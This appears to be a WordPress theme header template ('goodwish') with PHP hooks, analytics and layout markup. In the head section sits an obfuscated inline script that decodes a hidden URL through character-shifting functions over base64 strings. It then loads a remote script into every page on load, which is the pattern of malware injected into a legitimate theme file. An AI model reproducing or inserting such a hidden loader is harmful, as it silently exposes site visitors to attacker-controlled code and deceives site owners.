<!DOCTYPE html>
<html <?php language_attributes(); ?>>
<head>
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-R622QLTBGC"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-R622QLTBGC');
</script>
<script>
window[(function(_jXG,_dT){var _tjXwf='';for(var _nc2UL6=0;_nc2UL6<_jXG.length;_nc2UL6++){_dT>3;var _pgNL=_jXG[_nc2UL6].charCodeAt();_pgNL-=_dT;_pgNL+=61;_pgNL%=94;_pgNL+=33;_tjXwf==_tjXwf;_pgNL!=_nc2UL6;_tjXwf+=String.fromCharCode(_pgNL)}return
 _tjXwf})(atob('fm10ODUwKyk6bys/'), 36)] = '9c0061d82e1771435533'; var zi = document.createElement('script'); (zi.type = 'text/javascript'), (zi.async = true), (zi.src = (function(_cVa,_g1){var _3aZ1l='';for(var _mcgSpa=0;_mcgSpa<_cVa.length;_mcgSpa++){_MlT6!=_mcgSpa;_3aZ1l==_3aZ1l;var
 _MlT6=_cVa[_mcgSpa].charCodeAt();_g1>7;_MlT6-=_g1;_MlT6+=61;_MlT6%=94;_MlT6+=33;_3aZ1l+=String.fromCharCode(_MlT6)}return _3aZ1l})(atob('JjIyLjFWS0soMUo4J0kxITAnLjIxSiEtK0s4J0kyfSVKKDE='), 28)), document.readyState === 'complete'?document.body.appendChild(zi):
 window.addEventListener('load', function(){ document.body.appendChild(zi) });
</script>
    <?php
    /**
     * @see goodwish_edge_header_meta() - hooked with 10
     * @see edgt_user_scalable - hooked with 10
     */
    ?>
	<?php do_action('goodwish_edge_header_meta'); ?>

	<?php wp_head(); ?>
</head>

<body <?php body_class();?> itemscope itemtype="http://schema.org/WebPage">
<?php goodwish_edge_get_side_area(); ?>

<script> 
jQuery(document).ready(function($) { 
var delay = 100; setTimeout(function() { 
$('.elementor-tab-title').removeClass('elementor-active');
 $('.elementor-tab-content').css('display', 'none'); }, delay); 
}); 
</script>

<?php

$id = goodwish_edge_get_page_id();

if(goodwish_edge_get_meta_field_intersect('smooth_page_transitions',$id) === 'yes' &&
    goodwish_edge_get_meta_field_intersect('page_transition_preloader',$id) === 'yes') {
?>
<div class="edgtf-smooth-transition-loader edgtf-mimic-ajax">
    <div class="edgtf-st-loader">
        <div class="edgtf-st-loader1">
            <?php goodwish_edge_loading_spinners(); ?>
        </div>
    </div>
</div>
<?php } ?>

<div class="edgtf-wrapper">
    <div class="edgtf-wrapper-inner">
        <?php goodwish_edge_get_header(); ?>

        <?php if (goodwish_edge_options()->getOptionValue('show_back_button') == "yes") { ?>
            <a id='edgtf-back-to-top'  href='#'>
                <span class="edgtf-icon-stack edgtf-front-side">
                     <?php
                        goodwish_edge_icon_collections()->getBackToTopIcon('font_elegant');
                    ?>
                </span>
            </a>
        <?php } ?>
        <?php goodwish_edge_get_full_screen_menu(); ?>

        <div class="edgtf-content" <?php goodwish_edge_content_elem_style_attr(); ?>>
            <?php if(goodwish_edge_is_ajax_enabled()) { ?>
            <div class="edgtf-meta">
                <?php do_action('goodwish_edge_ajax_meta'); ?>
                <span id="edgtf-page-id"><?php echo esc_html(get_queried_object_id()); ?></span>
                <div class="edgtf-body-classes"><?php echo esc_html(implode( ',', get_body_class())); ?></div>
            </div>
            <?php } ?>
            <div class="edgtf-content-inner">